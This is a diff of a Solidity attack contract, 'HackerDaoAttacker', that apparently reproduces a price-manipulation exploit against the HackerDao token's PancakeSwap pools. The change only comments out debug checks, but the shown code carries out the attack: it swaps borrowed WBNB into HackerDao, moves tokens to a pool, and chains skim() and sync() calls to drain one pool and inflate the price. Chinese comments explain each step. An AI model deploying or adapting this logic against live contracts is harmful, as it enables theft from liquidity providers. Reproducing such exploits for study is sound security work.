@@ -103,20 +103,20 @@ contract HackerDaoAttacker is Ownable {
         path[0] = WBNB;
         path[1] = HackerDao;
         // lb_amt * 0.9 = 10315400487514994955409
-        require(lb_amt == 11_335_604_931_335_159_291_659, "for debug 11_335_604_931_335_159_291_659"); // for debug
+        // require(lb_amt == 11_335_604_931_335_159_291_659, "for debug 11_335_604_931_335_159_291_659"); // for debug
         uint[] memory amounts = IPancakeRouter(PancakerRouter).getAmountsIn(10_315_400_487_514_994_955_409, path); // 计算一下，要掏空池子里面90%的 hackerdao需要多少wbnb
         uint deadline =  block.timestamp + 6 hours;
         IPancakeRouter(PancakerRouter).swapExactTokensForTokens(amounts[0], 0, path, address(this), deadline); // 将借来的WBNB 换成HackerDao
         console.log("after swap Now my WBNB num # %s",IWBNB(WBNB).balanceOf(address(this)));
         uint256 lp_hackerdao_amt = IHackerDao(HackerDao).balanceOf(address(this));
-        require(lp_hackerdao_amt == 9_077_552_429_013_195_560_760,"debug lp_hackerdao_amt");
+        // require(lp_hackerdao_amt == 9_077_552_429_013_195_560_760,"debug lp_hackerdao_amt");
         IHackerDao(HackerDao).transfer(PancakeLP_HackerDao_WBNB_0xcd4c, lp_hackerdao_amt); // 将换来的HackerDao 转到HackerDao-WBNB的 panckakeLP上
 
         IPancakePair(PancakeLP_HackerDao_WBNB_0xcd4c).skim(PancakeLP_USDT_HackerDao_0xbdb4); // 让pancake的hackerdao-WBNB LP向USDT HackerDao HackerDao的LP上skim，skim的时候由于HackerDao的规则导致HackerDao WBNB LP自身的 HackerDao token也会被当作手续费减少，进而导致HackerDao的价格抬高了
         IPancakePair(PancakeLP_USDT_HackerDao_0xbdb4).skim(address(this)); // 将上一步skim得的HackerDao skim给自己
         IPancakePair(PancakeLP_HackerDao_WBNB_0xcd4c).sync(); // 更新 HackerDao-WBNB的价格
         uint256 my_hackerdao_amt = IHackerDao(HackerDao).balanceOf(address(this));
-        require(my_hackerdao_amt ==  7_029_656_601_027_818_642_253,"my_hackerdao_amt");
+        // require(my_hackerdao_amt ==  7_029_656_601_027_818_642_253,"my_hackerdao_amt");
         console.log("now I have %s HackerDao", my_hackerdao_amt);
         address[] memory revert_path = new address[](2);
         revert_path[0] = HackerDao;
